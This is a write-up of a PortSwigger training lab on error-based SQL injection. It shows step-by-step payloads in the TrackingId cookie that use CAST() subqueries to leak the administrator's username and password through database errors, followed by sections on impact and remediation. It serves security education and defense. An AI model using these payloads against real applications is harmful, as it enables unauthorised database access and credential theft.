# SQL Injection — Lab: Blind SQL Injection with Visible Error-Based SQL Injection

[Lab URL](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-sql-injection-visible-error-based)

## Objective

This lab contains a SQL injection vulnerability in the `TrackingId` cookie.

The objective is to exploit visible database errors to retrieve the administrator username and password, then log in as the `administrator` user.

---

## Initial Reconnaissance

I opened the lab using the Burp Suite built-in browser.

I went to **Proxy → HTTP history** and found the `GET /` request containing the `TrackingId` cookie.

The request was sent to **Burp Repeater** for testing.

---

## Interesting Parameter

The interesting parameter was the `TrackingId` cookie.

The original cookie value was:

```text
TrackingId=ogAZZfxtOKUELbuJ
```

The `TrackingId` value was selected for SQL injection testing.

---

## Testing

I appended a single quote to the `TrackingId` value:

```text
TrackingId=ogAZZfxtOKUELbuJ'
```

The application returned a verbose database error revealing that the SQL query contained an unclosed string literal.

This indicated that the cookie value was being inserted into a SQL query inside a single-quoted string.

I then added a SQL comment:

```text
TrackingId=ogAZZfxtOKUELbuJ'--
```

The error disappeared, confirming that the injected quote closed the original string and the `--` comment removed the remainder of the query.

Next, I tested a subquery:

```text
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
```

The application returned an error indicating that the `AND` condition must be boolean.

I changed the condition to:

```text
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
```

This produced no error.

---

## Observation

The `CAST()` function could be used to force the database to convert a selected value into an integer.

If the selected value was not a valid integer, the database error could reveal that value.

I first attempted to retrieve the username:

```text
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
```

The original cookie value caused character-limit issues around the injected comment, so I removed the original value:

```text
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
```

The database then reported that the subquery returned more than one row.

I limited the result to one row:

```text
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

The error message revealed:

```text
ERROR: invalid input syntax for type integer: "administrator"
```

Therefore, the username was:

```text
administrator
```

I then used the same technique against the `password` column:

```text
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

The resulting database error revealed the administrator password.

---

## Vulnerability

The application is vulnerable to **SQL Injection with visible database errors**.

The `TrackingId` cookie can be manipulated so that user-controlled input changes the SQL query.

The application also exposes detailed database errors, allowing injected queries to disclose database values.

---

## Exploitation

I used the SQL injection vulnerability to extract the administrator credentials.

The administrator username was:

```text
administrator
```

The password was obtained from the database error generated by:

```text
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

I then used the extracted credentials to log in as the `administrator` user.

---

## Why It Worked

The vulnerability occurs because the `TrackingId` value is incorporated into a SQL query without being safely parameterized.

Conceptually, the application contains a query where the cookie value is used inside a quoted SQL string.

The injected quote closes the original string:

```text
'
```

The `--` sequence comments out the remaining SQL.

The injected condition:

```sql
1=CAST((SELECT username FROM users LIMIT 1) AS int)
```

forces the database to cast the selected username to an integer.

Because `"administrator"` is not a valid integer, the database generates an error containing the username.

The same technique can be applied to the password column.

The root cause is **improper handling of user input when constructing the SQL query combined with verbose database error disclosure**.

---

## Impact

An attacker could potentially:

* Manipulate SQL queries through the `TrackingId` cookie.
* Retrieve sensitive database values through error messages.
* Extract usernames and passwords.
* Compromise application accounts when credentials are exposed.
* Access functionality available to compromised accounts.

The exact impact in a real application would depend on the database privileges and the application's error-handling configuration.

---

## Remediation

The primary defense against SQL injection is to use **parameterized queries / prepared statements** instead of constructing SQL queries by concatenating user input.

Developers should also:

* Use prepared statements for database queries.
* Validate input appropriately.
* Apply least-privilege permissions to database accounts.
* Avoid exposing detailed database errors to users.
* Return generic application errors instead of raw database errors.
* Implement appropriate authentication and authorization controls.
* Perform security testing against cookie and other user-controlled parameters.

Input filtering alone should not be relied upon as the primary defense against SQL injection.

## Lessons Learned

* How to identify SQL injection through database errors.
* How a single quote can reveal a SQL string-context injection.
* How SQL comments can terminate the remaining query.
* How Boolean conditions can be used to build a valid SQL injection.
* How `CAST()` can be used to trigger visible database errors.
* How `LIMIT 1` can make a subquery return a single value.
* How database error messages can disclose sensitive information.
* Why verbose database errors should not be exposed to users.
* Why parameterized queries are important for preventing SQL injection.

---

## Key Takeaway

This lab demonstrated how a SQL injection vulnerability combined with visible database errors can be used to extract sensitive database information.

By forcing the database to cast selected values to an integer, invalid conversion errors disclosed the administrator username and password.

The correct defense is to separate **SQL code from user-controlled data**, primarily through parameterized queries and prepared statements, while also preventing detailed database errors from reaching users.
